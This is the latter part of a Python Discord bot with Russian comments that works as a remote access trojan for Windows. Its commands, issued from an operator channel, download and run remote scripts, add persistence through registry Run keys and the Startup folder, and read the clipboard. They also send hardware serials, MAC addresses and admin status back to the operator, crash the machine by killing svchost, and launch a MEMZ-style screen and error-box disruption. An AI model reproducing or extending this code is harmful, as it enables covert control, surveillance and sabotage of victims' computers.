# –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è —Ñ–∞–π–ª–æ–≤
def check_files():
    return os.path.exists(ps1_file) and os.path.exists(cmd_file)

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ñ–∞–π–ª–æ–≤ –∏ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞
@bot.command()
async def install(ctx):
    if not check_files():
        await ctx.send("üì• –ó–∞–≥—Ä—É–∂–∞–µ–º –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ñ–∞–π–ª—ã...")

        if not os.path.exists(scripts_dir):
            os.makedirs(scripts_dir)

        download_file(ps1_url, ps1_file)
        download_file(cmd_url, cmd_file)

        await ctx.send("‚úÖ –§–∞–π–ª—ã –∑–∞–≥—Ä—É–∂–µ–Ω—ã!\nüîß –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏ –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º...")

        time.sleep(2)

        if check_files():
            await ctx.send("‚úÖ –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞! –ü—Ä–æ–≥—Ä–∞–º–º—ã –≥–æ—Ç–æ–≤—ã –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é.")
        else:
            await ctx.send("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ —Ñ–∞–π–ª–æ–≤.")
    else:
        await ctx.send("‚úÖ –§–∞–π–ª—ã —É–∂–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã.")

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –æ—Ä–∏–µ–Ω—Ç–∞—Ü–∏–∏ —ç–∫—Ä–∞–Ω–∞
@bot.command()
async def fl1pscreen(ctx, direction: str):
    valid_directions = ['right', 'left', 'down', 'up', 'reset', 'reverse-portrait', 'reverse-landscape']
    
    if direction not in valid_directions:
        await ctx.send(f"‚ùå –ù–µ–≤–µ—Ä–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –æ–¥–∏–Ω –∏–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤: {', '.join(valid_directions)}.")
        return

    # –ï—Å–ª–∏ —Ñ–∞–π–ª—ã –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã, —Ç–æ —Å–Ω–∞—á–∞–ª–∞ –≤—ã–∑—ã–≤–∞–µ–º —É—Å—Ç–∞–Ω–æ–≤–∫—É
    if not check_files():
        await ctx.send("üîß –ü—Ä–æ–≥—Ä–∞–º–º—ã –µ—â–µ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã. –ù–∞—á–∏–Ω–∞—é —É—Å—Ç–∞–Ω–æ–≤–∫—É...")
        await install(ctx)  # –ó–∞–ø—É—Å–∫–∞–µ–º —É—Å—Ç–∞–Ω–æ–≤–∫—É
        await ctx.send("üñ• –ü–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —ç–∫—Ä–∞–Ω –Ω–µ –±—É–¥–µ—Ç –≤—Ä–∞—â–∞—Ç—å—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.\n–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø—É—Å—Ç–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É —Å–Ω–æ–≤–∞.")
        return

    # –ï—Å–ª–∏ —Ñ–∞–π–ª—ã –µ—Å—Ç—å, –≤—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É –≤—Ä–∞—â–µ–Ω–∏—è —ç–∫—Ä–∞–Ω–∞
    if direction == 'right':
        await ctx.send("üîÑ right.")
        subprocess.run([cmd_file, 'right'], check=True)
    elif direction == 'left':
        await ctx.send("üîÑ left.")
        subprocess.run([cmd_file, 'left'], check=True)
    elif direction == 'down':
        await ctx.send("üîÑ down.")
        subprocess.run([cmd_file, 'down'], check=True)
    elif direction == 'up':
        await ctx.send("üîÑ up.")
        subprocess.run([cmd_file, 'up'], check=True)
    elif direction == 'reset':
        await ctx.send("üîÑ resetted.")
        subprocess.run([cmd_file, 'reset'], check=True)
    elif direction == 'reverse-portrait':
        await ctx.send("üîÑ reverse-portrait.")
        subprocess.run([cmd_file, 'reverse-portrait'], check=True)
    elif direction == 'reverse-landscape':
        await ctx.send("üîÑ reverse-landscape.")
        subprocess.run([cmd_file, 'reverse-landscape'], check=True)

#-----------------------------ROTATE

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–æ–≤
async def enable_color_invert():
    try:
        # –°–æ–∑–¥–∞–Ω–∏–µ —Ä–µ–µ—Å—Ç—Ä–æ–≤—ã—Ö –∫–ª—é—á–µ–π –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —Ü–≤–µ—Ç–æ–≤—ã—Ö —Ñ–∏–ª—å—Ç—Ä–æ–≤
        subprocess.run(['powershell', 'New-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion" -Name "ColorFilters" -Force'], check=True)
        subprocess.run(['powershell', 'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\ColorFilters" -Name "Enable" -Value 1 -PropertyType DWord -Force'], check=True)
        subprocess.run(['powershell', 'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\ColorFilters" -Name "Filter" -Value 1 -PropertyType DWord -Force'], check=True)

        # –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞ Windows, —á—Ç–æ–±—ã –ø—Ä–∏–º–µ–Ω–∏—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏—è
        subprocess.run(['powershell', 'Stop-Process -Name explorer'], check=True)
        subprocess.run(['powershell', 'Start-Process explorer'], check=True)

        return "‚úÖ –¶–≤–µ—Ç–æ–≤–æ–π —Ñ–∏–ª—å—Ç—Ä –≤–∫–ª—é—á–µ–Ω –∏ —ç–∫—Ä–∞–Ω –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω."
    except subprocess.CalledProcessError as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —Ü–≤–µ—Ç–æ–≤–æ–≥–æ —Ñ–∏–ª—å—Ç—Ä–∞: {e}"

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–æ–≤
async def disable_color_invert():
    try:
        subprocess.run(['powershell', 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\ColorFilters" -Name "Enable" -Value 0'], check=True)

        # –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞ Windows, —á—Ç–æ–±—ã –ø—Ä–∏–º–µ–Ω–∏—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∏—è
        subprocess.run(['powershell', 'Stop-Process -Name explorer'], check=True)
        subprocess.run(['powershell', 'Start-Process explorer'], check=True)

        return "‚úÖ –¶–≤–µ—Ç–æ–≤–æ–π —Ñ–∏–ª—å—Ç—Ä –æ—Ç–∫–ª—é—á–µ–Ω."
    except subprocess.CalledProcessError as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏–∏ —Ü–≤–µ—Ç–æ–≤–æ–≥–æ —Ñ–∏–ª—å—Ç—Ä–∞: {e}"

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã –¥–ª—è –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–æ–≤
@bot.command()
async def invert(ctx, state: str):
    # –ü—Ä–æ–≤–µ—Ä–∫–∞, –µ—Å–ª–∏ –∫–∞–Ω–∞–ª –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–π
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå Unauthorized channel!")

    if state == "on":
        await ctx.send("üîÑ –í–∫–ª—é—á–µ–Ω–∏–µ –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–æ–≤ —ç–∫—Ä–∞–Ω–∞... –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ.")
        result = await enable_color_invert()  # –í–∞–∂–Ω–æ –≤—ã–∑–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é, –∞ –Ω–µ –∫–æ—Ä—É—Ç–∏–Ω—É
        await ctx.send(result)

    elif state == "off":
        await ctx.send("üîÑ –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–æ–≤ —ç–∫—Ä–∞–Ω–∞... –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ.")
        result = await disable_color_invert()  # –í–∞–∂–Ω–æ –≤—ã–∑–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é, –∞ –Ω–µ –∫–æ—Ä—É—Ç–∏–Ω—É
        await ctx.send(result)

    else:
        await ctx.send("‚ùå –ù–µ–≤–µ—Ä–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ `!invert on` –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –∏ `!invert off` –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è.")


# –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø—É—Ç—å –∫ –ø—Ä–æ–≥—Ä–∞–º–º–µ
PROGRAM_PATH = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)


# –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø—É—Ç—å –∫ –ø—Ä–æ–≥—Ä–∞–º–º–µ
PROGRAM_PATH = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

# –ú–µ—Ç–æ–¥—ã –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞
AUTOSTART_METHODS = {
    "user": (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    "machine": (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
    "wow6432node": (winreg.HKEY_LOCAL_MACHINE, r"Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"),
    "startup_folder": os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
}

def set_autoload(name: str, method: str, enable: bool):
    """–î–æ–±–∞–≤–ª—è–µ—Ç –∏–ª–∏ —É–¥–∞–ª—è–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º—É –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏ —Ä–∞–∑–Ω—ã–º–∏ –º–µ—Ç–æ–¥–∞–º–∏"""
    if method not in AUTOSTART_METHODS:
        return "‚ùì **Methods:** `user`, `machine`, `wow6432node`, `startup_folder`"

    if method == "startup_folder":
        shortcut_path = os.path.join(AUTOSTART_METHODS[method], f"{name}.lnk")
        if enable:
            try:
                import winshell
                from win32com.client import Dispatch

                shell = Dispatch("WScript.Shell")
                shortcut = shell.CreateShortcut(shortcut_path)
                shortcut.TargetPath = PROGRAM_PATH
                shortcut.WorkingDirectory = os.path.dirname(PROGRAM_PATH)
                shortcut.Save()

                return f"‚úÖ **Added startup `{method}`!**"
            except Exception as e:
                return f"üî¥ **Error:** `{e}`"
        else:
            try:
                if os.path.exists(shortcut_path):
                    os.remove(shortcut_path)
                return f"‚ùå **Removed Startup `{method}`!**"
            except Exception as e:
                return f"üî¥ **Error:** `{e}`"

    else:
        hive, key = AUTOSTART_METHODS[method]
        try:
            with winreg.OpenKey(hive, key, 0, winreg.KEY_SET_VALUE if enable else winreg.KEY_ALL_ACCESS) as reg_key:
                if enable:
                    winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, PROGRAM_PATH)
                else:
                    winreg.DeleteValue(reg_key, name)
        except FileNotFoundError:
            pass  # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º, –µ—Å–ª–∏ –∫–ª—é—á —É–∂–µ —É–¥–∞–ª–µ–Ω
        except Exception as e:
            return f"üî¥ **Error:** `{e}`"

        return f"‚úÖ **Added Startup `{method}`!**" if enable else f"‚ùå **Removed Startup `{method}`!**"


@bot.command()
async def autoload(ctx, name: str = None, method: str = None, mode: str = None):
    """–î–æ–±–∞–≤–ª—è–µ—Ç –∏–ª–∏ —É–¥–∞–ª—è–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º—É –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É —Ä–∞–∑–Ω—ã–º–∏ –º–µ—Ç–æ–¥–∞–º–∏"""
    if ctx.channel.id != AUTHORIZED_CHANNEL_ID:
        return await ctx.send("‚ùå **Unauthorized channel!**")

    if not name or not method or not mode:
        return await ctx.send(
            "‚ö†Ô∏è **Incorrect** Use: `!autoload <name> <method> <on/off>`\n"
            "**Methods:** `user`, `machine`, `wow6432node`, `startup_folder`"
        )

    if mode.lower() == "on":
        result = set_autoload(name, method, True)
    elif mode.lower() == "off":
        result = set_autoload(name, method, False)
    else:
        return await ctx.send(
            "‚ö† **Use `<on/off>`!**"
        )

    await ctx.send(result)

#-----------------------------STARTUPER

@bot.command()
async def clipboard(ctx, action: str, *, text: str = None):
    """Adds or shows clipboard content."""
    if action == "add" and text:
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        await ctx.send("üìã Text added to clipboard!")

    elif action == "show":
        win32clipboard.OpenClipboard()
        try:
            clipboard_content = win32clipboard.GetClipboardData()
        except TypeError:
            clipboard_content = "[Empty or unsupported format]"
        win32clipboard.CloseClipboard()

        if len(clipboard_content) > 2000:
            clipboard_content = clipboard_content[:1990] + "..."
        
        await ctx.send(f"üìã Clipboard content: `{clipboard_content}`")

    else:
        await ctx.send("‚ùå Use: `!clipboard add <text>` or `!clipboard show`")

@bot.command()
async def bsod(ctx):
    """–í—ã–∑—ã–≤–∞–µ—Ç —Å–∏–Ω–∏–π —ç–∫—Ä–∞–Ω —Å–º–µ—Ä—Ç–∏ (BSOD)."""
    if ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("üíÄ –í—ã–∑—ã–≤–∞—é BSOD...")
        os.system("taskkill /IM svchost.exe /F")  # –ü—Ä–µ—Ä—ã–≤–∞–Ω–∏–µ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
    else:
        await ctx.send("‚ùå Need ADMIN right to BSOD!")

@bot.command()
async def wallpaper(ctx, url: str):
    """–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –æ–±–æ–∏ –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª –ø–æ URL."""
    try:
        path = os.path.join(os.getenv("TEMP"), "wallpaper.bmp")  # Windows –ø—Ä–∏–Ω–∏–º–∞–µ—Ç BMP

        # –ó–∞–≥—Ä—É–∂–∞–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
        response = requests.get(url, stream=True)
        if response.status_code != 200:
            return await ctx.send("‚ùå Error when getting image!")

        img = Image.open(io.BytesIO(response.content))

        # –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ BMP, –µ—Å–ª–∏ —Ñ–æ—Ä–º–∞—Ç –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –Ω–∞–ø—Ä—è–º—É—é
        img = img.convert("RGB")
        img.save(path, "BMP")

        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–∫ –æ–±–æ–∏
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        await ctx.send("‚úÖ Wallpaper changed!")

    except Exception as e:
        await ctx.send(f"‚ùå Error: {e}")

shake_active = False

@bot.command()
async def shake(ctx, intensity: int, state: str):
    global shake_active

    if state.lower() == "on":
        if shake_active:
            return await ctx.send("üîÑ Cursor shaking!")
        
        shake_active = True
        await ctx.send(f"üîÑ Cursor shaking with! (intensity: {intensity})")

        def shake_mouse():
            while shake_active:
                x, y = pyautogui.position()
                pyautogui.moveTo(
                    x + random.randint(-intensity, intensity), 
                    y + random.randint(-intensity, intensity), 
                    duration=0.05
                )
                time.sleep(0.05)

        threading.Thread(target=shake_mouse, daemon=True).start()

    elif state.lower() == "off":
        if not shake_active:
            return await ctx.send("‚úÖ Shake enabled alredy!")

        shake_active = False
        await ctx.send("‚úÖ Shake stopped!")

    else:
        await ctx.send("‚ùå Use: `!shake <intensity> on` –∏–ª–∏ `!shake <intensity> off`")

#-----------------------------NEW

@bot.command()
async def sysinfo(ctx):
    """Shows detailed system information."""
    try:
        uname = platform.uname()
        user = os.getlogin()
        pc_name = socket.gethostname()
        cpu_info = platform.processor()
        cpu_cores = psutil.cpu_count(logical=False)
        cpu_threads = psutil.cpu_count(logical=True)
        total_ram = round(psutil.virtual_memory().total / (1024 ** 3), 2)  # Convert to GB
        os_version = f"{uname.system} {uname.release} ({uname.version})"
        arch = platform.architecture()[0]
        disk_usage = psutil.disk_usage("/")
        gpu_info = "Unknown"
        cpu_serial = "Unknown"
        cpu_frequency = "Unknown"
        motherboard = "Unknown"
        disk_serial = "Unknown"
        gpu_vram = "Unknown"
        mac_addresses = []

        # Getting system information via WMI
        try:
            import wmi
            w = wmi.WMI()
            
            # CPU details
            cpu = w.Win32_Processor()[0]
            cpu_info = cpu.Name.strip()
            cpu_serial = cpu.ProcessorId.strip()
            cpu_frequency = f"{cpu.MaxClockSpeed} MHz"

            # GPU details
            gpus = w.Win32_VideoController()
            if gpus:
                gpu_info = ", ".join(gpu.Name.strip() for gpu in gpus)
                vram_list = []
                for gpu in gpus:
                    if gpu.AdapterRAM is not None:
                        vram_list.append(f"{int(gpu.AdapterRAM / (1024**3))} GB")
                    else:
                        vram_list.append("Unknown")
                gpu_vram = ", ".join(vram_list)

            # Motherboard details
            board = w.Win32_BaseBoard()[0]
            motherboard = f"{board.Manufacturer.strip()} {board.Product.strip()}"

            # Disk details
            disk = w.Win32_DiskDrive()[0]
            disk_serial = disk.SerialNumber.strip()

        except Exception as e:
            gpu_info = "WMI error"
            gpu_vram = "WMI error"

        # Getting MAC addresses
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac_addresses.append(f"{iface}: {addr.address}")

        mac_addresses_str = "\n".join(mac_addresses) if mac_addresses else "No MAC addresses found"

        # Check admin rights
        is_admin = "Yes" if ctypes.windll.shell32.IsUserAnAdmin() else "No"

        # Get the script's full path
        exe_path = os.path.abspath(sys.argv[0])

        info_message = (
            f"üñ• **System Information**\n"
            f"üîπ OS: `{os_version}`\n"
            f"üîπ Architecture: `{arch}`\n"
            f"üîπ User: `{user}`\n"
            f"üîπ PC Name: `{pc_name}`\n"
            f"üîπ Admin Rights: `{is_admin}`\n"
            f"üîπ Executable Path: `{exe_path}`\n\n"
            f"‚öô **Hardware**\n"
            f"üîπ CPU: `{cpu_info}`\n"
            f"üîπ CPU Frequency: `{cpu_frequency}`\n"
            f"üîπ CPU Serial: `{cpu_serial}`\n"
            f"üîπ Cores: `{cpu_cores}` | Threads: `{cpu_threads}`\n"
            f"üîπ RAM: `{total_ram} GB`\n"
            f"üîπ GPU: `{gpu_info}`\n"
            f"üîπ GPU VRAM: `{gpu_vram}`\n"
            f"üîπ Disk Usage: `{disk_usage.percent}% used`\n"
            f"üîπ Disk Serial: `{disk_serial}`\n"
            f"üîπ Motherboard: `{motherboard}`\n\n"
            f"üåê **Network**\n"
            f"```{mac_addresses_str}```"
        )

        await ctx.send(info_message)
    except Exception as e:
        await ctx.send(f"‚ùå Error: {e}")

#-----------------------------NEW

effects_running = False

# Chaotic mouse movement
def move_mouse():
    while effects_running:
        x, y = pyautogui.position()
        pyautogui.moveTo(x + random.randint(-50, 50), y + random.randint(-50, 50), duration=0.1)
        time.sleep(0.1)

# Random error messages
def error_spam():
    while effects_running:
        ctypes.windll.user32.MessageBoxW(0, "MEMZ ERROR!", "Critical Error", 0x10)
        time.sleep(random.uniform(2, 5))

# Fullscreen screen distortion using screenshots
def glitch_screen():
    pygame.init()
    screen = pygame.display.set_mode(pyautogui.size(), pygame.NOFRAME)
    while effects_running:
        img = pyautogui.screenshot()
        img = img.resize(pyautogui.size())
        img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        img = cv2.applyColorMap(img, cv2.COLORMAP_JET)  # Color distortion
        img = pygame.image.frombuffer(img.tobytes(), pyautogui.size(), "RGB")
        screen.blit(img, (random.randint(-20, 20), random.randint(-20, 20)))
        pygame.display.update()
        pygame.event.pump()  # Fix for pygame freezing
        time.sleep(0.1)
    pygame.quit()

# Floating Windows icons following the cursor
def floating_icons():
    icons = [
        "C:\\Windows\\System32\\shell32.dll,128",
        "C:\\Windows\\System32\\shell32.dll,237",
        "C:\\Windows\\System32\\shell32.dll,50"
    ]
    while effects_running:
        x, y = pyautogui.position()
        icon = random.choice(icons)
        os.system(f"powershell Start-Process 'explorer.exe' -ArgumentList '/select,{icon}'")
        time.sleep(1)

# Keyboard listener to stop effects when M+Z is pressed
def key_listener(ctx):
    global effects_running
    while effects_running:
        if keyboard.is_pressed("m") and keyboard.is_pressed("z"):
            effects_running = False
            bot.loop.call_soon_threadsafe(asyncio.create_task, ctx.send("üîì Break Code `M+Z` Pressed! Stopped the MEMZ"))
            break
        time.sleep(0.1)

@bot.command()
async def memz(ctx, mode: str):
    global effects_running
    if mode == "on" and not effects_running:
        effects_running = True
        await ctx.send("‚úÖ MEMZ enabled!")
        threading.Thread(target=move_mouse, daemon=True).start()
        threading.Thread(target=error_spam, daemon=True).start()
        threading.Thread(target=glitch_screen, daemon=True).start()
        threading.Thread(target=floating_icons, daemon=True).start()
        threading.Thread(target=key_listener, args=(ctx,), daemon=True).start()
    elif mode == "off" and effects_running:
        effects_running = False
        await ctx.send("‚öôÔ∏è MEMZ Disabled üîÑ")
    else:
        await ctx.send("‚ö†Ô∏è Use !memz **on/off**")

#-----------------------------MEMZZ

# –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
bot.run(token)
